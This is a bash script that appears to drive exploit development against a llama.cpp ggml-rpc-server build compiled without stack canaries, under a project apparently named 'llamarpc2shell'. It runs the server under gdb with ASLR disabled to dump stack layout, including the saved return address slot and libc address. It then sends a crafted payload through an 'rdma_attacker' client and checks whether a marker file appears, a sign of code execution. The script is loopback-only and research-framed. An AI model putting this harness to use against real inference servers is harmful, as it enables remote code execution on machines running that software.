#!/usr/bin/env bash
# One bounded loopback-only experiment for the early-return obstacle.
# MODE=measure: gdb layout dump under setarch -R, 43-byte SEND.
# MODE=attack:  no debugger, raw RDMA_PAYLOAD_FILE SEND, check benign marker.
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WIRE="$ROOT/wire"
EVID="$WIRE/evidence"
PORT="${PORT:-53060}"
TAG="${TAG:-repair}"
MODE="${MODE:-measure}"
CREATED=0
SRV=0
GDB_PID=""
LOG="$EVID/$TAG.log"
MARKER="${R5_MARKER:-/tmp/llamarpc2shell-r5-marker}"
SERVER="${SERVER:-$ROOT/src/llama.cpp-pin-nocanary/bin/ggml-rpc-server}"

cleanup() {
  if [ -n "$GDB_PID" ]; then kill "$GDB_PID" 2>/dev/null || true; wait "$GDB_PID" 2>/dev/null || true; fi
  if [ "$SRV" -ne 0 ]; then kill "$SRV" 2>/dev/null || true; wait "$SRV" 2>/dev/null || true; fi
  if [ "$CREATED" -eq 1 ]; then sudo -n rdma link del rxe0 2>/dev/null || true; fi
}
trap cleanup EXIT

if ! sudo -n rdma link show 2>/dev/null | grep -q rxe0; then
  sudo -n modprobe rdma_rxe || exit 2
  sudo -n rdma link add rxe0 type rxe netdev lo || exit 2
  CREATED=1
fi

: > "$LOG"
rm -f "$MARKER"
if [ "$MODE" = measure ]; then
  GDB_CMD="${GDB_CMD:-$WIRE/gdb-measure-noaslr.cmd}"
  /usr/bin/env -i PATH=/usr/bin:/bin HOME=/home/mesh-home TERM=dumb \
    setarch x86_64 -R gdb -q --batch -x "$GDB_CMD" --args \
    "$SERVER" -H 127.0.0.1 -p "$PORT" > "$LOG" 2>&1 &
  SRV=$!
  for _ in $(seq 1 100); do grep -q 'Starting RPC server' "$LOG" && break; sleep 0.1; done
  grep -q 'Starting RPC server' "$LOG" || { echo "server did not start" >&2; sed -n '1,30p' "$LOG" >&2; exit 3; }
  RDMA_LEN="${RDMA_LEN:-43}"
  RDMA_PAYLOAD_FILE="${RDMA_PAYLOAD_FILE:-}" "$WIRE/rdma_attacker" 127.0.0.1 "$PORT" "$RDMA_LEN" \
    > "$EVID/client-$TAG.log" 2>&1
  CLIENT_RC=$?
  for _ in $(seq 1 100); do grep -q 'HIT rdma_recv' "$LOG" && break; sleep 0.1; done
  sleep 1
  grep -E 'cmd address:|rpc rbp:|saved rip slot:|server.buffers address:|sock address:|libc\.so\.6' "$LOG" | sed -n '1,20p'
elif [ "$MODE" = observe ]; then
  GDB_CMD="${GDB_CMD:-$WIRE/gdb-observe-repair.cmd}"
  PAYLOAD="${RDMA_PAYLOAD_FILE:-$EVID/repair-payload.bin}"
  /usr/bin/env -i PATH=/usr/bin:/bin HOME=/home/mesh-home TERM=dumb \
    setarch x86_64 -R gdb -q --batch -x "$GDB_CMD" --args \
    "$SERVER" -H 127.0.0.1 -p "$PORT" > "$LOG" 2>&1 &
  SRV=$!
  for _ in $(seq 1 100); do grep -q 'Starting RPC server' "$LOG" && break; sleep 0.1; done
  grep -q 'Starting RPC server' "$LOG" || { echo "server did not start" >&2; exit 3; }
  RDMA_PAYLOAD_FILE="$PAYLOAD" "$WIRE/rdma_attacker" 127.0.0.1 "$PORT" "$(stat -c %s "$PAYLOAD")" \
    > "$EVID/client-$TAG.log" 2>&1
  CLIENT_RC=$?
  for _ in $(seq 1 100); do grep -q 'INFERIOR STOPPED' "$LOG" && break; sleep 0.1; done
  sleep 1
  echo "client_rc=$CLIENT_RC marker=$([ -e "$MARKER" ] && echo PRESENT || echo ABSENT)"
  grep -A16 'INFERIOR STOPPED' "$LOG"
else
  PAYLOAD="${RDMA_PAYLOAD_FILE:-$EVID/repair-payload.bin}"
  /usr/bin/env -i PATH=/usr/bin:/bin HOME=/home/mesh-home TERM=dumb LINES=24 COLUMNS=80 \
    setarch x86_64 -R "$SERVER" -H 127.0.0.1 -p "$PORT" > "$LOG" 2>&1 &
  SRV=$!
  for _ in $(seq 1 100); do grep -q 'Starting RPC server' "$LOG" && break; sleep 0.1; done
  grep -q 'Starting RPC server' "$LOG" || { echo "server did not start" >&2; sed -n '1,30p' "$LOG" >&2; exit 3; }
  RDMA_PAYLOAD_FILE="$PAYLOAD" "$WIRE/rdma_attacker" 127.0.0.1 "$PORT" "$(stat -c %s "$PAYLOAD")" \
    > "$EVID/client-$TAG.log" 2>&1
  CLIENT_RC=$?
  sleep 2
  echo "client_rc=$CLIENT_RC marker=$([ -e "$MARKER" ] && echo PRESENT || echo ABSENT)"
  echo "--- client ---"; cat "$EVID/client-$TAG.log"
  echo "--- server tail ---"; tail -30 "$LOG"
fi
